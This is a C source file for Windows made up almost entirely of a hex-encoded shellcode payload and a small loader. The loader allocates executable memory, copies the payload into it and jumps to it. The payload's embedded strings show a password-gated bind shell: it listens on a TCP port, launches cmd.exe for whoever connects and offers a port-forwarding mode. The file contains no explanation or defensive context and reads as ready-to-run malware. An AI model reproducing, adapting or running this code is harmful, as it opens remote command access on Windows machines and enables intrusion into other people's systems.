#include <windows.h>
#include <stdio.h> 

char shellcode[] =
"\xe8\x00\x00\x00\x00\x5a\x8d\x52\xfb\x52\x89\xe5\x81\xec\x00\x05\x00\x00\xbb\x8e\xfe\x1f\x4b\xe8\xd7"
"\x02\x00\x00\x8b\x55\x00\x55\x89\xc5\x8d\xb2\x8e\x03\x00\x00\x8d\xba\x9e\x03\x00\x00\xe8\xf6\x02\x00"
"\x00\x5d\x8b\x55\x00\x8d\x82\x0e\x04\x00\x00\x50\xff\x92\xa6\x03\x00\x00\x8b\x55\x00\x55\x89\xc5\x8d"
"\xb2\xaa\x03\x00\x00\x8d\xba\xde\x03\x00\x00\xe8\xce\x02\x00\x00\x5d\x8b\x55\x00\x81\xec\x90\x01\x00"
"\x00\x54\xb9\x02\x02\x00\x00\x51\xff\x92\xe6\x03\x00\x00\x81\xc4\x90\x01\x00\x00\x8b\x55\x00\x6a\x00"
"\x6a\x00\x6a\x00\x6a\x06\x6a\x01\x6a\x02\xff\x92\xe2\x03\x00\x00\x89\x45\xf4\x8b\x55\x00\x6a\x00\x6a"
"\x00\x6a\x02\x66\xc7\x44\x24\x02\x27\x0f\x89\xe6\x6a\x10\x56\x8b\x7d\xf4\x57\xff\x92\xee\x03\x00\x00"
"\x83\xc4\x0c\x8b\x55\x00\x85\xc0\xb8\x01\x00\x00\x00\x0f\x85\x81\x01\x00\x00\x6a\x01\x57\xff\x92\xfa"
"\x03\x00\x00\x8b\x55\x00\x85\xc0\xb8\x02\x00\x00\x00\x0f\x85\x68\x01\x00\x00\x6a\x00\x6a\x00\x8b\x7d"
"\xf4\x57\xff\x92\xea\x03\x00\x00\x8b\x55\x00\x89\x45\xfc\x89\xe3\x6a\x00\x6a\x09\x53\xff\x75\xfc\xff"
"\x92\xfe\x03\x00\x00\x8b\x55\x00\x5b\x59\x81\xfb\x70\x61\x73\x73\x0f\x85\x3a\x01\x00\x00\x81\xf9\x77"
"\x6f\x72\x64\x0f\x85\x2e\x01\x00\x00\x6a\x00\x6a\x39\x8d\x82\x32\x04\x00\x00\x50\xff\x75\xfc\xff\x92"
"\x06\x04\x00\x00\x8b\x55\x00\x8b\x75\xfc\x89\xe3\x6a\x00\x6a\x0f\x53\x56\xff\x92\xfe\x03\x00\x00\x8b"
"\x55\x00\x8d\xb2\x6b\x04\x00\x00\x89\xe7\xb9\x05\x00\x00\x00\xf3\xa6\x0f\x84\x8c\x00\x00\x00\x8d\xb2"
"\x71\x04\x00\x00\x89\xe7\xb9\x07\x00\x00\x00\xf3\xa6\x74\x05\xe9\xd8\x00\x00\x00\x6a\x00\x6a\x00\x6a"
"\x00\x6a\x06\x6a\x01\x6a\x02\xff\x92\xe2\x03\x00\x00\x89\x45\xf8\x8b\x55\x00\x68\x7f\x00\x00\x01\x6a"
"\x02\x66\xc7\x44\x24\x02\x04\x57\x89\xe0\x6a\x10\x50\xff\x75\xf8\xff\x92\xf6\x03\x00\x00\x83\xc4\x0c"
"\x8b\x55\x00\x85\xc0\x74\x0e\xff\x92\xde\x03\x00\x00\x8b\x55\x00\xe9\x85\x00\x00\x00\x8b\x75\xfc\x8b"
"\x7d\xf8\x56\xe8\xb6\x00\x00\x00\x85\xc0\x74\x07\x57\x56\xe8\xd6\x00\x00\x00\x57\xe8\xa5\x00\x00\x00"
"\x85\xc0\x74\xdf\x56\x57\xe8\xc5\x00\x00\x00\xeb\xd6\x8b\x75\xfc\x56\x56\x56\x6a\x00\x6a\x00\x68\x00"
"\x01\x00\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x00\x6a\x44"
"\x89\xe3\x83\xec\x10\x54\x53\x6a\x00\x6a\x00\x6a\x00\x6a\x01\x6a\x00\x6a\x00\x8d\x82\x19\x04\x00\x00"
"\x50\x6a\x00\xff\x92\x9e\x03\x00\x00\x83\xc4\x54\x8b\x55\x00\x85\xc0\xb8\x04\x00\x00\x00\x74\x05\xb8"
"\x00\x00\x00\x00\x50\xff\x92\xa2\x03\x00\x00\x6a\x00\x6a\x11\x8d\x82\x21\x04\x00\x00\x50\xff\x75\xfc"
"\xff\x92\x06\x04\x00\x00\x8b\x55\x00\x6a\x02\xff\x75\xfc\xff\x92\x0a\x04\x00\x00\x8b\x55\x00\xff\x75"
"\xfc\xff\x92\xf2\x03\x00\x00\x8b\x55\x00\xe9\x5b\xfe\xff\xff\x55\x52\x89\xe5\xff\x75\x0c\x6a\x01\x89"
"\xe0\x6a\x00\x6a\x00\x6a\x01\x6a\x00\x89\xe3\x53\x6a\x00\x6a\x00\x50\x6a\x00\xff\x92\x02\x04\x00\x00"
"\x83\xc4\x18\x5a\x5d\xc2\x04\x00\x55\x52\x89\xe5\x81\xec\x00\x01\x00\x00\x8b\x75\x0c\x8b\x7d\x10\x89"
"\x65\xfc\x6a\x00\x6a\x50\xff\x75\xfc\x56\xff\x92\xfe\x03\x00\x00\x8b\x55\x00\x83\xf8\xff\x0f\x84\x6b"
"\xff\xff\xff\x6a\x00\x50\x8d\x45\xfc\xff\x30\x57\xff\x92\x06\x04\x00\x00\x8b\x55\x00\x81\xc4\x00\x01"
"\x00\x00\x5a\x5d\xc3\xfc\x31\xff\x64\x8b\x3d\x30\x00\x00\x00\x8b\x7f\x0c\x8b\x7f\x14\x8b\x77\x28\x31"
"\xd2\x66\xad\x84\xc0\x74\x11\x3c\x41\x72\x06\x3c\x5a\x77\x02\x0c\x20\xc1\xc2\x07\x30\xc2\xeb\xe9\x39"
"\xda\x8b\x47\x10\x8b\x3f\x75\xdb\xc3\x89\xea\x03\x52\x3c\x8b\x52\x78\x01\xea\x8b\x5a\x20\x01\xeb\x31"
"\xc9\x57\x56\x8b\x36\x8b\x3b\x01\xef\x52\x31\xd2\xc1\xc2\x07\x32\x17\x47\x80\x3f\x00\x75\xf5\x92\x5a"
"\x39\xf0\x74\x0c\x83\xc3\x04\x41\x39\x4a\x18\x75\xdf\x5e\x5f\xc3\x5e\x5f\xad\x56\x53\x89\xeb\x89\xde"
"\x03\x5a\x24\x8d\x04\x4b\x0f\xb7\x00\x8d\x04\x86\x03\x42\x1c\x8b\x00\x01\xf0\xab\x5b\x5e\x83\xc3\x04"
"\x41\x81\x3e\xff\xff\x00\x00\x75\xad\xc3\xc7\x8a\x31\x46\x19\x2b\x90\x95\x26\x80\xac\xc8\xff\xff\x00"
"\x00\x01\x00\x00\x00\x02\x00\x00\x00\x03\x00\x00\x00\x72\x80\x87\x8e\x14\x35\xfa\xee\x7d\x75\xde\xcd"
"\x7a\x7b\x79\x3c\x64\x77\x5a\x0c\x9c\x7d\x9d\x93\x8a\xfe\xd8\xed\x88\x31\x7d\x9e\xf6\x71\x59\x0e\x6a"
"\x72\x99\x5d\x64\x77\x79\x0e\x41\x58\x7c\x4c\xff\xff\x00\x00\x04\x00\x00\x00\x05\x00\x00\x00\x06\x00"
"\x00\x00\x07\x00\x00\x00\x08\x00\x00\x00\x09\x00\x00\x00\x0a\x00\x00\x00\x0b\x00\x00\x00\x0c\x00\x00"
"\x00\x0d\x00\x00\x00\x0e\x00\x00\x00\x0f\x00\x00\x00\x77\x73\x32\x5f\x33\x32\x2e\x64\x6c\x6c\x00\x63"
"\x6d\x64\x2e\x65\x78\x65\x00\x44\x65\x6e\x69\x65\x64\x2c\x20\x67\x6f\x6f\x64\x62\x79\x65\x0a\x00\x0a"
"\x41\x63\x63\x65\x70\x74\x65\x64\x2c\x20\x77\x65\x6c\x63\x6f\x6d\x65\x21\x0a\x45\x6e\x74\x65\x72\x20"
"\x63\x6f\x6d\x6d\x61\x6e\x64\x20\x27\x73\x68\x65\x6c\x6c\x27\x20\x6f\x72\x20\x27\x66\x6f\x72\x77\x61"
"\x72\x64\x27\x3a\x20\x00\x73\x68\x65\x6c\x6c\x00\x66\x6f\x72\x77\x61\x72\x64\x00";



int main(int argc, char **argv) {

	//HINSTANCE hInstLib = LoadLibrary(TEXT("user32.dll"));
	int i = 0, len = 0, target_addy = 0;
	int offset = 0x0;

	void *stage = VirtualAlloc(0, 0x1000, 0x1000,0x40 );
	printf("[*] Memory allocated: 0x%08x\n", stage);

	len = sizeof(shellcode);
	printf("[*] Size of Shellcode: %08x\n", len);

	memmove(stage, shellcode, 0x1000);
	printf("[*] Shellcode copied\n");

	target_addy = (char*)stage + offset;
	printf("[*] Adjusting offset: 0x%08x\n", target_addy);
	
	__asm {
		//int 3		
		mov eax, target_addy	// jump to shellcode
		jmp eax
	}
}